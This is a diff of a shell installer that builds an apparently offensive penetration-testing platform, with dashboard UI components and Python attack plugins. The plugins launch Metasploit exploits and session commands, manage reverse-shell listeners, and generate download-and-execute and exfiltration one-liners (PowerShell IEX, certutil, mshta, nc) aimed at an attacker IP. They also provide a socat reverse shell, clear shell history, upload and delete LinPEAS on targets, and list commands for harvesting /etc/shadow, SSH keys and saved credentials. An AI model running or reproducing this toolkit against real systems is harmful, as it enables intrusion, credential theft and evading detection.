+    <div>
+      <div style={{ display: "flex", gap: 8, marginBottom: 14, flexWrap: "wrap" }}>
+        {[["all","All",null],["new","New","green"],["closed","Closed","red"],["changed","Changed","yellow"]].map(([val,label,col]) => (
+          <button key={val} onClick={() => setFilter(val)} style={{ padding: "4px 14px", borderRadius: 4, border: "none", cursor: "pointer", fontSize: 12,
+            background: filter === val ? "#3b82f6" : "#1e293b", color: filter === val ? "#fff" : "#94a3b8" }}>
+            {label}{col && <span style={BADGE(col)}>{summary[val] ?? 0}</span>}
+          </button>
+        ))}
+      </div>
+      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
+        {[["Baseline", baseline, closed_ports, "red"], ["Current", current, new_ports, "green"]].map(([title, data, special, color]) => (
+          <div key={title} style={{ background: "#0f172a", borderRadius: 8, padding: 14, border: "1px solid #1e293b" }}>
+            <div style={{ fontWeight: 700, color: "#38bdf8", marginBottom: 10, fontSize: 14 }}>{title}</div>
+            {allPorts.filter(show).map(port => {
+              const info = data?.[port] || special[port];
+              const rowColor = special[port] ? color : changed_services[port] ? "yellow" : "none";
+              if (!info) return null;
+              return (
+                <div key={port} style={ROW(rowColor)}>
+                  <code style={{ color: "#38bdf8" }}>:{port}</code>
+                  {` ${info.service || "?"} ${info.version || ""}`}
+                  {special[port] && <span style={BADGE(color)}>{color === "green" ? "NEW" : "CLOSED"}</span>}
+                  {changed_services[port] && color === "green" && (
+                    <span style={{ fontSize: 11, color: "#f59e0b", marginLeft: 6 }}>
+                      {Object.entries(changed_services[port]).map(([f,{before,after}]) => `${f}: ${before}→${after}`).join(", ")}
+                    </span>
+                  )}
+                </div>
+              );
+            })}
+          </div>
+        ))}
+      </div>
+      <p style={{ fontSize: 11, color: "#475569", marginTop: 8 }}>
+        Baseline: <code>{diff.baseline_id?.slice(0,8)}</code> → Current: <code>{diff.scan_id?.slice(0,8)}</code>
+        {" | "}{summary.unchanged ?? 0} unchanged
+      </p>
+    </div>
+  );
+}
+JSX
+
+# ── UI: Stats Bar ─────────────────────────────────────────────────────────────
+cat > "$UI/src/StatsBar.jsx" <<'JSX'
+import { useEffect, useState } from "react";
+
+export function StatsBar({ api }) {
+  const [stats, setStats] = useState(null);
+
+  useEffect(() => {
+    const load = () => api.get("/stats").then(({ data }) => setStats(data)).catch(() => {});
+    load();
+    const t = setInterval(load, 15000);
+    return () => clearInterval(t);
+  }, [api]);
+
+  if (!stats) return null;
+
+  const items = [
+    { label: "Total Scans", value: stats.scans?.total ?? 0, color: "#38bdf8" },
+    { label: "Complete", value: stats.scans?.complete ?? 0, color: "#22c55e" },
+    { label: "Running", value: stats.scans?.running ?? 0, color: "#f59e0b" },
+    { label: "Failed", value: stats.scans?.failed ?? 0, color: "#ef4444" },
+    { label: "Cancelled", value: stats.scans?.cancelled ?? 0, color: "#94a3b8" },
+    { label: "Credentials", value: stats.credentials?.total ?? 0, color: "#a78bfa" },
+    { label: "Valid Creds", value: stats.credentials?.valid ?? 0, color: "#f472b6" },
+    { label: "Notes", value: stats.notes ?? 0, color: "#64748b" },
+  ];
+
+  return (
+    <div style={{ display: "flex", gap: 10, marginBottom: 20, flexWrap: "wrap" }}>
+      {items.map(({ label, value, color }) => (
+        <div key={label} style={{ background: "#1e293b", padding: "10px 16px", borderRadius: 8, flex: 1, minWidth: 100 }}>
+          <p style={{ fontSize: 26, fontWeight: 700, margin: 0, color }}>{value}</p>
+          <p style={{ fontSize: 11, color: "#64748b", margin: "2px 0 0" }}>{label}</p>
+        </div>
+      ))}
+    </div>
+  );
+}
+JSX
+
+log "OK" "════════════════════════════════════════════════"
+log "OK" "Bug fixes applied to uploaded file:"
+log "OK" "  ✓ create_token({dict}) TypeError — fixed to positional args"
+log "OK" "  ✓ CORS missing http://ui:5173 (Docker service name)"
+log "OK" "  ✓ Dockerfile.api pip wheel missing dnspython/ldap3/paramiko/pysnmp"
+log "OK" "  ✓ Dockerfile.api apt missing enum4linux/snmp/ldap-utils/smbclient"
+log "OK" "  ✓ SSE /stream endpoint had zero authentication"
+log "OK" "New features added:"
+log "OK" "  ✓ requirements.txt — all deps with version pins"
+log "OK" "  ✓ core/rate_limiter.py — brute force protection (5 auth attempts/min)"
+log "OK" "  ✓ core/validators.py — target/URL validation + HTB range detection"
+log "OK" "  ✓ GET  /stats — live dashboard stats"
+log "OK" "  ✓ DELETE /scans/{id} — scan deletion (admin)"
+log "OK" "  ✓ GET  /targets/{target}/history — per-target history + HTB detection"
+log "OK" "  ✓ GET  /scans/{id}/gobuster — retrieve gobuster results via API"
+log "OK" "  ✓ POST /auth/token/safe — rate-limited auth endpoint"
+log "OK" "  ✓ src/AttackGraph.jsx — SVG attack path graph with CVE severity coloring"
+log "OK" "  ✓ src/LiveTerminal.jsx — live event streaming with color-coded output"
+log "OK" "  ✓ src/SideBySideDiff.jsx — two-column diff with new/closed/changed filters"
+log "OK" "  ✓ src/StatsBar.jsx — live stats bar (auto-refreshes every 15s)"
+log "OK" "════════════════════════════════════════════════"
+warn "Run: $BASE/start.sh to start all services"
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ACTIVE EXPLOITATION + POST-EXPLOITATION + WEB TESTING + INTELLIGENCE
+# ══════════════════════════════════════════════════════════════════════════════
+
+if command -v sudo >/dev/null 2>&1; then
+  sudo apt install -y metasploit-framework ncat 2>/dev/null || \
+    warn "metasploit/ncat install failed — install manually from https://metasploit.com"
+fi
+
+python3 -m pip install pymetasploit3 PyJWT python-jose pyjwt cryptography 2>/dev/null || true
+
+# ── Metasploit RPC Integration ────────────────────────────────────────────────
+cat > "$BASE/plugins/msf_rpc.py" <<'PY'
+"""
+Metasploit RPC integration.
+Requires: msfrpcd running — start with:
+  msfconsole -q -x 'load msgrpc ServerHost=127.0.0.1 ServerPort=55553 Pass=msf123 SSL=false'
+Or:
+  msfdb init && msfrpcd -P msf123 -S -a 127.0.0.1
+"""
+import logging
+import os
+from typing import Optional
+
+logger = logging.getLogger(__name__)
+
+MSF_HOST = os.getenv("MSF_HOST", "127.0.0.1")
+MSF_PORT = int(os.getenv("MSF_PORT", "55553"))
+MSF_PASS = os.getenv("MSF_PASS", "msf123")
+MSF_SSL  = os.getenv("MSF_SSL", "false").lower() == "true"
+
+try:
+    from pymetasploit3.msfrpc import MsfRpcClient
+    MSF_AVAILABLE = True
+except ImportError:
+    MSF_AVAILABLE = False
+
+
+def _client() -> Optional[object]:
+    if not MSF_AVAILABLE:
+        return None
+    try:
+        return MsfRpcClient(MSF_PASS, server=MSF_HOST, port=MSF_PORT, ssl=MSF_SSL)
+    except Exception as exc:
+        logger.warning(f"MSF RPC connect failed: {exc}")
+        return None
+
+
+def msf_status() -> dict:
+    if not MSF_AVAILABLE:
+        return {"available": False, "message": "pymetasploit3 not installed"}
+    c = _client()
+    if not c:
+        return {"available": False, "connected": False,
+                "message": f"Cannot connect to msfrpcd at {MSF_HOST}:{MSF_PORT}. "
+                           f"Start with: msfconsole -x 'load msgrpc Pass={MSF_PASS} SSL=false'"}
+    try:
+        version = c.core.version()
+        return {"available": True, "connected": True,
+                "version": version.get("version", "unknown"),
+                "ruby": version.get("ruby", ""), "api": version.get("api", "")}
+    except Exception as exc:
+        return {"available": True, "connected": False, "error": str(exc)}
+
+
+def list_modules(module_type: str = "exploit", search: str = "") -> list:
+    c = _client()
+    if not c:
+        return []
+    try:
+        mods = getattr(c.modules, module_type)
+        if search:
+            return [m for m in mods if search.lower() in m.lower()][:100]
+        return list(mods)[:200]
+    except Exception as exc:
+        logger.error(f"list_modules failed: {exc}")
+        return []
+
+
+def get_module_info(module_type: str, module_name: str) -> dict:
+    c = _client()
+    if not c:
+        return {}
+    try:
+        mod = c.modules.use(module_type, module_name)
+        return {
+            "name": module_name,
+            "type": module_type,
+            "description": getattr(mod, "description", ""),
+            "author": getattr(mod, "author", []),
+            "rank": getattr(mod, "rank", ""),
+            "references": getattr(mod, "references", []),
+            "options": {k: {"required": v.get("required"), "default": v.get("default"),
+                            "desc": v.get("desc")} for k, v in (getattr(mod, "options", None) or {}).items()},
+        }
+    except Exception as exc:
+        logger.error(f"get_module_info failed: {exc}")
+        return {"error": str(exc)}
+
+
+def run_module(module_type: str, module_name: str, options: dict,
+               payload: str = "", payload_options: dict = None) -> dict:
+    c = _client()
+    if not c:
+        return {"error": "MSF not connected"}
+    try:
+        mod = c.modules.use(module_type, module_name)
+        for k, v in options.items():
+            mod[k] = v
+        if payload and module_type == "exploit":
+            p = c.modules.use("payload", payload)
+            if payload_options:
+                for k, v in payload_options.items():
+                    p[k] = v
+            job_id = mod.execute(payload=p)
+        else:
+            job_id = mod.execute()
+        return {"status": "launched", "job_id": str(job_id),
+                "module": module_name, "options": options}
+    except Exception as exc:
+        logger.error(f"run_module failed: {exc}")
+        return {"error": str(exc)}
+
+
+def list_sessions() -> dict:
+    c = _client()
+    if not c:
+        return {}
+    try:
+        return {k: {"type": v.get("type"), "tunnel_local": v.get("tunnel_local"),
+                    "tunnel_peer": v.get("tunnel_peer"), "via_exploit": v.get("via_exploit"),
+                    "info": v.get("info"), "arch": v.get("arch"), "platform": v.get("platform")}
+                for k, v in (c.sessions.list or {}).items()}
+    except Exception as exc:
+        logger.error(f"list_sessions failed: {exc}")
+        return {}
+
+
+def session_exec(session_id: str, command: str) -> str:
+    c = _client()
+    if not c:
+        return ""
+    try:
+        shell = c.sessions.session(session_id)
+        shell.write(command + "\n")
+        import time; time.sleep(1.5)
+        return shell.read()
+    except Exception as exc:
+        logger.error(f"session_exec failed: {exc}")
+        return str(exc)
+
+
+def list_jobs() -> dict:
+    c = _client()
+    if not c:
+        return {}
+    try:
+        return c.jobs.list or {}
+    except Exception as exc:
+        return {"error": str(exc)}
+
+
+def kill_job(job_id: str) -> bool:
+    c = _client()
+    if not c:
+        return False
+    try:
+        c.jobs.stop(job_id)
+        return True
+    except Exception:
+        return False
+PY
+
+
+# ── Reverse Shell Catcher ─────────────────────────────────────────────────────
+cat > "$BASE/plugins/shell_catcher.py" <<'PY'
+"""
+Reverse shell listener manager.
+Manages multiple netcat/ncat listeners, logs connections and output.
+"""
+import logging
+import os
+import queue
+import shutil
+import subprocess
+import threading
+import time
+from datetime import datetime, timezone
+from pathlib import Path
+from typing import Optional
+
+logger = logging.getLogger(__name__)
+
+LOOT_DIR = os.path.expanduser("~/omni-sentinel-v21.3/output/shells")
+_listeners: dict = {}   # port -> {proc, thread, log_path, connected, output_queue}
+_lock = threading.Lock()
+
+
+def _log_path(port: int) -> str:
+    Path(LOOT_DIR).mkdir(parents=True, exist_ok=True)
+    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
+    return str(Path(LOOT_DIR) / f"shell_{port}_{ts}.log")
+
+
+def start_listener(port: int, host: str = "0.0.0.0") -> dict:
+    with _lock:
+        if port in _listeners:
+            return {"status": "already_running", "port": port}
+
+    tool = shutil.which("ncat") or shutil.which("nc")
+    if not tool:
+        return {"status": "error", "message": "ncat/nc not found"}
+
+    log_path = _log_path(port)
+    out_q: queue.Queue = queue.Queue(maxsize=500)
+
+    cmd = [tool, "-lnvp", str(port)] if "ncat" not in tool else \
+          [tool, "-lnvp", str(port), "--keep-open"]
+
+    try:
+        proc = subprocess.Popen(
+            cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT, text=True,
+        )
+    except Exception as exc:
+        return {"status": "error", "message": str(exc)}
+
+    def _reader():
+        with open(log_path, "w") as logf:
+            logf.write(f"[{datetime.now(timezone.utc).isoformat()}] Listener started on {host}:{port}\n")
+            while proc.poll() is None:
+                try:
+                    line = proc.stdout.readline()
+                    if line:
+                        ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
+                        entry = f"[{ts}] {line.rstrip()}"
+                        logf.write(entry + "\n")
+                        logf.flush()
+                        try:
+                            out_q.put_nowait(entry)
+                        except queue.Full:
+                            out_q.get_nowait()
+                            out_q.put_nowait(entry)
+                except Exception:
+                    break
+
+    t = threading.Thread(target=_reader, daemon=True, name=f"listener-{port}")
+    t.start()
+
+    with _lock:
+        _listeners[port] = {
+            "proc": proc, "thread": t, "log_path": log_path,
+            "host": host, "port": port, "output_queue": out_q,
+            "started_at": datetime.now(timezone.utc).isoformat(),
+        }
+
+    logger.info(f"Listener started on {host}:{port} (pid={proc.pid})")
+    return {"status": "started", "port": port, "pid": proc.pid, "log_path": log_path}
+
+
+def stop_listener(port: int) -> dict:
+    with _lock:
+        info = _listeners.pop(port, None)
+    if not info:
+        return {"status": "not_found", "port": port}
+    try:
+        info["proc"].terminate()
+        info["proc"].wait(timeout=5)
+    except Exception:
+        try:
+            info["proc"].kill()
+        except Exception:
+            pass
+    logger.info(f"Listener stopped on port {port}")
+    return {"status": "stopped", "port": port, "log_path": info["log_path"]}
+
+
+def send_to_shell(port: int, command: str) -> dict:
+    with _lock:
+        info = _listeners.get(port)
+    if not info:
+        return {"status": "not_found"}
+    try:
+        info["proc"].stdin.write(command + "\n")
+        info["proc"].stdin.flush()
+        time.sleep(0.3)
+        lines = []
+        while True:
+            try:
+                lines.append(info["output_queue"].get_nowait())
+            except queue.Empty:
+                break
+        return {"status": "sent", "output": lines}
+    except Exception as exc:
+        return {"status": "error", "message": str(exc)}
+
+
+def get_listener_output(port: int, max_lines: int = 100) -> list:
+    with _lock:
+        info = _listeners.get(port)
+    if not info:
+        return []
+    lines = []
+    while len(lines) < max_lines:
+        try:
+            lines.append(info["output_queue"].get_nowait())
+        except queue.Empty:
+            break
+    return lines
+
+
+def list_listeners() -> list:
+    with _lock:
+        return [
+            {"port": p, "host": v["host"], "pid": v["proc"].pid,
+             "alive": v["proc"].poll() is None,
+             "started_at": v["started_at"], "log_path": v["log_path"]}
+            for p, v in _listeners.items()
+        ]
+
+
+def read_shell_log(port: int) -> str:
+    with _lock:
+        info = _listeners.get(port)
+    if not info:
+        return ""
+    try:
+        return Path(info["log_path"]).read_text(errors="replace")
+    except Exception:
+        return ""
+PY
+
+
+# ── File Transfer Helper ──────────────────────────────────────────────────────
+cat > "$BASE/plugins/file_transfer.py" <<'PY'
+"""
+Generates one-liners for file transfer to/from target.
+Supports HTTP server, SMB, FTP, base64, certutil, PowerShell, curl, wget.
+"""
+import os
+import socket
+
+MY_IP = os.getenv("LHOST", "")
+
+
+def _get_local_ip() -> str:
+    if MY_IP:
+        return MY_IP
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return "ATTACKER_IP"
+
+
+def http_server_commands(port: int = 8080) -> dict:
+    return {
+        "python3": f"python3 -m http.server {port}",
+        "python2": f"python -m SimpleHTTPServer {port}",
+        "php": f"php -S 0.0.0.0:{port}",
+        "ruby": f"ruby -run -ehttpd . -p{port}",
+        "updog": f"updog -p {port}",
+    }
+
+
+def download_commands(filename: str, port: int = 8080,
+                      save_as: str = "", os_type: str = "linux") -> dict:
+    ip = _get_local_ip()
+    url = f"http://{ip}:{port}/{filename}"
+    save = save_as or filename
+    if os_type == "linux":
+        return {
+            "wget":    f"wget {url} -O {save}",
+            "curl":    f"curl {url} -o {save}",
+            "fetch":   f"fetch {url}",
+            "python3": f"python3 -c \"import urllib.request; urllib.request.urlretrieve('{url}','{save}')\"",
+            "bash_tcp":f"bash -c 'cat < /dev/tcp/{ip}/{port} > {save}'",
+        }
+    else:  # windows
+        return {
+            "certutil":    f"certutil -urlcache -split -f {url} {save}",
+            "powershell":  f"powershell -c \"(New-Object Net.WebClient).DownloadFile('{url}','{save}')\"",
+            "ps_iwr":      f"powershell -c \"Invoke-WebRequest -Uri '{url}' -OutFile '{save}'\"",
+            "ps_iex":      f"powershell -c \"IEX(New-Object Net.WebClient).DownloadString('{url}')\"",
+            "bitsadmin":   f"bitsadmin /transfer job /download /priority foreground {url} %USERPROFILE%\\{save}",
+            "mshta":       f"mshta {url}",
+        }
+
+
+def upload_commands(filename: str, port: int = 8080) -> dict:
+    ip = _get_local_ip()
+    return {
+        "curl_put":       f"curl -X PUT http://{ip}:{port}/{filename} --data-binary @{filename}",
+        "curl_form":      f"curl -F 'file=@{filename}' http://{ip}:{port}/upload",
+        "nc_send":        f"nc {ip} {port} < {filename}",
+        "python3_post":   f"python3 -c \"import requests; requests.post('http://{ip}:{port}/upload', files={{'f': open('{filename}','rb')}})\"",
+        "scp":            f"scp {filename} user@{ip}:/tmp/",
+    }
+
+
+def base64_transfer(filename: str, os_type: str = "linux") -> dict:
+    if os_type == "linux":
+        return {
+            "encode":   f"base64 -w 0 {filename}",
+            "decode":   f"echo '<BASE64>' | base64 -d > {filename}",
+            "pipe":     f"cat {filename} | base64 -w 0 | xclip -selection clipboard",
+        }
+    else:
+        return {
+            "encode_ps":  f"[Convert]::ToBase64String([IO.File]::ReadAllBytes('{filename}'))",
+            "decode_ps":  f"[IO.File]::WriteAllBytes('{filename}',[Convert]::FromBase64String('<BASE64>'))",
+            "encode_cert":f"certutil -encode {filename} {filename}.b64",
+            "decode_cert":f"certutil -decode {filename}.b64 {filename}",
+        }
+
+
+def smb_server_commands(share_name: str = "share") -> dict:
+    ip = _get_local_ip()
+    return {
+        "impacket":        f"impacket-smbserver {share_name} $(pwd) -smb2support",
+        "impacket_creds":  f"impacket-smbserver {share_name} $(pwd) -smb2support -username user -password pass123",
+        "windows_connect": f"net use \\\\{ip}\\{share_name}",
+        "windows_copy":    f"copy \\\\{ip}\\{share_name}\\file.exe C:\\Windows\\Temp\\",
+        "windows_exec":    f"\\\\{ip}\\{share_name}\\exploit.exe",
+    }
+
+
+def all_transfers(filename: str, port: int = 8080) -> dict:
+    return {
+        "http_servers": http_server_commands(port),
+        "linux_download": download_commands(filename, port, os_type="linux"),
+        "windows_download": download_commands(filename, port, os_type="windows"),
+        "upload": upload_commands(filename, port),
+        "base64_linux": base64_transfer(filename, "linux"),
+        "base64_windows": base64_transfer(filename, "windows"),
+        "smb": smb_server_commands(),
+        "attacker_ip": _get_local_ip(),
+    }
+PY
+
+
+# ── TTY Upgrade ───────────────────────────────────────────────────────────────
+cat > "$BASE/plugins/tty_upgrade.py" <<'PY'
+"""Generates TTY upgrade sequences for different shell environments."""
+
+TTY_UPGRADES = {
+    "python3": {
+        "steps": [
+            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+            "# Press Ctrl+Z to background",
+            "stty raw -echo; fg",
+            "# Press Enter twice",
+            "export TERM=xterm-256color",
+            "stty rows 50 cols 200",
+        ],
+        "description": "Python3 pty spawn (most common)",
+    },
+    "python2": {
+        "steps": [
+            "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
+            "# Press Ctrl+Z",
+            "stty raw -echo; fg",
+            "export TERM=xterm-256color",
+            "stty rows 50 cols 200",
+        ],
+        "description": "Python2 pty spawn",
+    },
+    "script": {
+        "steps": [
+            "script /dev/null -c bash",
+            "# Press Ctrl+Z",
+            "stty raw -echo; fg",
+            "reset",
+            "export TERM=xterm-256color",
+            "stty rows 50 cols 200",
+        ],
+        "description": "script command (when no python available)",
+    },
+    "socat": {
+        "attacker": "socat file:`tty`,raw,echo=0 tcp-listen:4444",
+        "target": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444",
+        "description": "Fully interactive via socat (best option)",
+    },
+    "rlwrap": {
+        "steps": ["rlwrap nc -lnvp 4444"],
+        "description": "rlwrap wrapper for basic readline support",
+    },
+    "stty_dimensions": {
+        "get_local": "stty -a | head -1",
+        "set_remote": "stty rows {rows} cols {cols}",
+        "description": "Fix terminal dimensions after upgrade",
+    },
+    "shell_paths": {
+        "check": "cat /etc/shells",
+        "bash": "/bin/bash",
+        "sh": "/bin/sh",
+        "dash": "/bin/dash",
+        "zsh": "/usr/bin/zsh",
+        "description": "Common shell paths to try",
+    },
+}
+
+SHELL_STABILIZE = [
+    "export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+    "export TERM=xterm-256color",
+    "export HOME=/root",
+    "alias ll='ls -la'",
+    "history -c",
+]
+
+
+def get_upgrade_sequence(method: str = "python3", rows: int = 50, cols: int = 200) -> dict:
+    result = TTY_UPGRADES.get(method, TTY_UPGRADES["python3"]).copy()
+    if method == "stty_dimensions":
+        result["set_remote"] = result["set_remote"].format(rows=rows, cols=cols)
+    result["stabilize"] = SHELL_STABILIZE
+    return result
+
+
+def all_upgrades() -> dict:
+    return TTY_UPGRADES
+PY
+
+# ── Auto LinPEAS/WinPEAS via SSH ──────────────────────────────────────────────
+cat > "$BASE/plugins/auto_linpeas.py" <<'PY'
+"""
+Automatically upload and execute LinPEAS/WinPEAS on target via SSH,
+then parse and return structured findings.
+"""
+import io
+import logging
+import os
+import shutil
+import tempfile
+import time
+from pathlib import Path
+from typing import Optional
+
+logger = logging.getLogger(__name__)
+
+LINPEAS_URL = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
+WINPEAS_URL = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe"
+PEAS_CACHE = os.path.expanduser("~/omni-sentinel-v21.3/output/peas")
+
+
+def _download_peas(url: str, filename: str) -> Optional[str]:
+    import requests
+    cache_path = Path(PEAS_CACHE) / filename
+    Path(PEAS_CACHE).mkdir(parents=True, exist_ok=True)
+    if cache_path.exists() and cache_path.stat().st_size > 10000:
+        logger.info(f"Using cached {filename}")
+        return str(cache_path)
+    try:
+        logger.info(f"Downloading {filename} from {url}")
+        r = requests.get(url, timeout=30, stream=True)
+        r.raise_for_status()
+        with open(cache_path, "wb") as f:
+            for chunk in r.iter_content(8192):
+                f.write(chunk)
+        return str(cache_path)
+    except Exception as exc:
+        logger.error(f"Download failed: {exc}")
+        return None
+
+
+def run_linpeas_ssh(
+    host: str,
+    username: str,
+    password: str = "",
+    key_path: str = "",
+    port: int = 22,
+    timeout: int = 300,
+    os_type: str = "linux",
+) -> dict:
+    try:
+        import paramiko
+    except ImportError:
+        return {"error": "paramiko not installed"}
+
+    peas_url = LINPEAS_URL if os_type == "linux" else WINPEAS_URL
+    peas_file = "linpeas.sh" if os_type == "linux" else "winpeas.exe"
+    local_path = _download_peas(peas_url, peas_file)
+    if not local_path:
+        return {"error": f"Failed to download {peas_file}"}
+
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    try:
+        connect_kwargs = {"hostname": host, "port": port, "username": username,
+                         "timeout": 15, "banner_timeout": 15}
+        if key_path and Path(key_path).exists():
+            connect_kwargs["key_filename"] = key_path
+        elif password:
+            connect_kwargs["password"] = password
+        else:
+            return {"error": "Provide password or key_path"}
+
+        ssh.connect(**connect_kwargs)
+        sftp = ssh.open_sftp()
+
+        remote_path = f"/tmp/.{peas_file}" if os_type == "linux" else f"C:\\Windows\\Temp\\{peas_file}"
+        sftp.put(local_path, remote_path)
+        sftp.close()
+
+        if os_type == "linux":
+            cmd = f"chmod +x {remote_path} && {remote_path} 2>/dev/null; rm -f {remote_path}"
+        else:
+            cmd = f"{remote_path} 2>nul & del {remote_path}"
+
+        logger.info(f"Executing {peas_file} on {host}")
+        _, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
+        output = stdout.read().decode("utf-8", errors="replace")
+        ssh.close()
+
+        # Save raw output
+        out_dir = Path(os.path.expanduser("~/omni-sentinel-v21.3/output/peas"))
+        out_dir.mkdir(parents=True, exist_ok=True)
+        out_file = out_dir / f"{host.replace('.', '_')}_{peas_file}.txt"
+        out_file.write_text(output, encoding="utf-8", errors="replace")
+
+        # Parse findings
+        from plugins.linpeas_parser import parse_linpeas
+        parsed = parse_linpeas(output)
+
+        return {
+            "host": host,
+            "os_type": os_type,
+            "output_file": str(out_file),
+            "output_length": len(output),
+            "parsed": parsed,
+        }
+
+    except Exception as exc:
+        logger.error(f"Auto LinPEAS failed: {exc}")
+        try:
+            ssh.close()
+        except Exception:
+            pass
+        return {"error": str(exc), "host": host}
+PY
+
+
+# ── Privilege Escalation Checklist ───────────────────────────────────────────
+cat > "$BASE/plugins/privesc_checklist.py" <<'PY'
+"""Auto-filled privilege escalation checklist based on OS + open ports."""
+import logging
+
+logger = logging.getLogger(__name__)
+
+LINUX_CHECKLIST = [
+    {"id": "sudo_l",     "title": "sudo -l",            "cmd": "sudo -l",                                          "category": "sudo"},
+    {"id": "suid",       "title": "SUID binaries",       "cmd": "find / -perm -4000 -type f 2>/dev/null",           "category": "suid"},
+    {"id": "sgid",       "title": "SGID binaries",       "cmd": "find / -perm -2000 -type f 2>/dev/null",           "category": "suid"},
+    {"id": "caps",       "title": "Capabilities",        "cmd": "getcap -r / 2>/dev/null",                          "category": "capabilities"},
+    {"id": "cron",       "title": "Cron jobs",           "cmd": "cat /etc/crontab; ls -la /etc/cron*; crontab -l",  "category": "cron"},
+    {"id": "writable",   "title": "Writable /etc",       "cmd": "find /etc -writable -type f 2>/dev/null",          "category": "filesystem"},
+    {"id": "passwd",     "title": "/etc/passwd writable","cmd": "ls -la /etc/passwd /etc/shadow /etc/sudoers",       "category": "filesystem"},
+    {"id": "nfs",        "title": "NFS no_root_squash",  "cmd": "cat /etc/exports 2>/dev/null",                     "category": "nfs"},
+    {"id": "path",       "title": "PATH hijack",         "cmd": "echo $PATH; find $(echo $PATH | tr ':' ' ') -writable 2>/dev/null", "category": "path"},
+    {"id": "env",        "title": "Env credentials",     "cmd": "env | grep -iE 'pass|key|secret|token|api'",       "category": "credentials"},
+    {"id": "history",    "title": "Shell history",       "cmd": "cat ~/.bash_history ~/.zsh_history 2>/dev/null | grep -iE 'pass|sudo|ssh|mysql|psql'", "category": "credentials"},
+    {"id": "ssh_keys",   "title": "SSH keys",            "cmd": "find / -name 'id_rsa*' -o -name '*.pem' 2>/dev/null | head -20", "category": "credentials"},
+    {"id": "passwd_hash","title": "Password hashes",     "cmd": "cat /etc/shadow 2>/dev/null | grep -v '!\\|\\*'",  "category": "credentials"},
+    {"id": "docker",     "title": "Docker group",        "cmd": "id | grep docker; docker ps 2>/dev/null",          "category": "containers"},
+    {"id": "lxd",        "title": "LXD/LXC group",       "cmd": "id | grep lxd",                                    "category": "containers"},
+    {"id": "disk",       "title": "Disk group",          "cmd": "id | grep disk",                                   "category": "groups"},
+    {"id": "adm",        "title": "adm/log group",       "cmd": "id | grep adm; find /var/log -readable 2>/dev/null | head -10", "category": "groups"},
+    {"id": "kernel",     "title": "Kernel version",      "cmd": "uname -a; cat /proc/version",                      "category": "kernel"},
+    {"id": "os_ver",     "title": "OS version",          "cmd": "cat /etc/os-release 2>/dev/null || cat /etc/issue","category": "kernel"},
+    {"id": "proc_root",  "title": "Processes as root",   "cmd": "ps aux | grep root",                               "category": "processes"},
+    {"id": "netstat",    "title": "Internal ports",      "cmd": "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null","category": "network"},
+    {"id": "timer",      "title": "Systemd timers",      "cmd": "systemctl list-timers --all 2>/dev/null",          "category": "cron"},
+    {"id": "backups",    "title": "Backup files",        "cmd": "find / -name '*.bak' -o -name '*.backup' -o -name '*.old' 2>/dev/null | head -20", "category": "filesystem"},
+    {"id": "db_creds",   "title": "DB credentials",      "cmd": "find / -name 'wp-config.php' -o -name '.env' -o -name 'config.php' 2>/dev/null | head -10", "category": "credentials"},
+    {"id": "mail",       "title": "Mail/spool",          "cmd": "ls /var/mail/ /var/spool/mail/ 2>/dev/null",       "category": "filesystem"},
+    {"id": "motd",       "title": "MOTD scripts",        "cmd": "ls -la /etc/update-motd.d/ 2>/dev/null",           "category": "cron"},
+    {"id": "ld_preload", "title": "LD_PRELOAD",          "cmd": "sudo -l | grep LD_PRELOAD",                        "category": "sudo"},
+]
+
+WINDOWS_CHECKLIST = [
+    {"id": "whoami",     "title": "whoami /all",         "cmd": "whoami /all",                                      "category": "info"},
+    {"id": "systeminfo", "title": "systeminfo",          "cmd": "systeminfo",                                       "category": "info"},
+    {"id": "hotfixes",   "title": "Missing hotfixes",    "cmd": "wmic qfe list brief",                              "category": "patches"},
+    {"id": "alwaysinst", "title": "AlwaysInstallElevated","cmd": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul && reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul", "category": "registry"},
+    {"id": "autologon",  "title": "AutoLogon creds",     "cmd": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword 2>nul", "category": "registry"},
+    {"id": "unquoted",   "title": "Unquoted service paths","cmd": "wmic service get pathname | findstr /i \"c:\\\\\" | findstr /iv '\"'", "category": "services"},
+    {"id": "svc_perms",  "title": "Weak service perms",  "cmd": "sc query state= all",                             "category": "services"},
+    {"id": "cmdkey",     "title": "Saved credentials",   "cmd": "cmdkey /list",                                     "category": "credentials"},
+    {"id": "ps_history", "title": "PS history",          "cmd": "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul", "category": "credentials"},
+    {"id": "scheduled",  "title": "Scheduled tasks",     "cmd": "schtasks /query /fo LIST /v | findstr /i \"task\\|run\\|status\"", "category": "tasks"},
+    {"id": "drivers",    "title": "Third-party drivers", "cmd": "driverquery /v | findstr /iv microsoft",           "category": "kernel"},
+    {"id": "applocker",  "title": "AppLocker policy",    "cmd": "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\SrpV2 2>nul", "category": "policy"},
+    {"id": "uac",        "title": "UAC level",           "cmd": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA", "category": "policy"},
